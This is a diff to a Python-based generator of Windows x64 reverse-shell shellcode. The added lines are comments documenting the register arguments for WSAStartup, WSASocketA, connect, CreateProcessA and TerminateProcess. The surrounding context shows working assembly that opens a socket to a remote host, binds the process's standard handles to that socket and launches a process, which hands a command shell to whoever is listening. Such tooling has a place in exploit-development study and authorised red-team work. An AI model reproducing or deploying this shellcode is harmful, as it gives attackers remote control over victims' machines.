@@ -265,12 +265,20 @@ _start:
         shellcode += self.resolve_functions()
         
         shellcode += f"""
+; RAX => WSAStartup([in]  WORD      wVersionRequired, // RCX
+;                   [out] LPWSADATA lpWSAData);       // RDX
 call_WSAStartup:
     mov rcx, 0x202
     lea rdx, [rbp - {self.storage_offsets['wsaData']}]
     mov rax, [rbp - {self.storage_offsets['WSAStartup']}]
     call rax
 
+; RAX => WSASocketA([in] int                 af,              // RCX
+;                   [in] int                 type,            // RDX
+;                   [in] int                 protocol,        // R8
+;                   [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,  // R9
+;                   [in] GROUP               g,               // RSP+0x20
+;                   [in] DWORD               dwFlags);        // RSP+0x28
 call_WSASocketA:
     mov ecx, {ws2def.AF_INET}
     mov edx, {winsock2.SOCK_STREAM}
@@ -282,6 +290,9 @@ call_WSASocketA:
     call rax
     mov rsi, rax
 
+; RAX => connect([in] SOCKET s,
+;                [in] const sockaddr *name,
+;                [in] int namelen);
 call_connect:
     mov rcx, rax
     mov r8, {ctypes.sizeof(ws2def.sockaddr)}
@@ -293,6 +304,7 @@ call_connect:
     mov rax, [rbp - {self.storage_offsets['connect']}]
     call rax
 
+; [RBX] => typedef struct _STARTUPINFOA {{ }}
 memset_STARTUPINFOA:
     lea rdi, [rbp - {self.storage_offsets['lpStartInfo']}]
     mov rbx, rdi
@@ -310,6 +322,16 @@ init_STARTUPINFOA:
     mov [rbx + {processthreadsapi._STARTUPINFOA.hStdOutput.offset}], rsi
     mov [rbx + {processthreadsapi._STARTUPINFOA.hStdError.offset}], rsi
 
+; RAX => CreateProcessA([in, optional]      LPCSTR                lpApplicationName,     // RCX
+;                       [in, out, optional] LPSTR                 lpCommandLine,         // RDX
+;                       [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,   // R8
+;                       [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,    // R9
+;                       [in]                BOOL                  bInheritHandles,       // RSP+0x20
+;                       [in]                DWORD                 dwCreationFlags,       // RSP+0x28
+;                       [in, optional]      LPVOID                lpEnvironment,         // RSP+0x30
+;                       [in, optional]      LPCSTR                lpCurrentDirectory,    // RSP+0x38
+;                       [in]                LPSTARTUPINFOA        lpStartupInfo,         // RSP+0x40
+;                       [out]               LPPROCESS_INFORMATION lpProcessInformation); // RSP+0x48
 call_CreateProccessA:
     xor ecx, ecx
     mov rdx, rbp
@@ -332,6 +354,8 @@ call_CreateProccessA:
     mov rax, [rbp - {self.storage_offsets['CreateProcessA']}]
     call rax
 
+; RAX => TerminateProcess([in] HANDLE hProcess,   // RCX
+;                         [in] UINT   uExitCode); // RDX
 call_TerminateProcess:
 	xor rcx, rcx
 	dec rcx
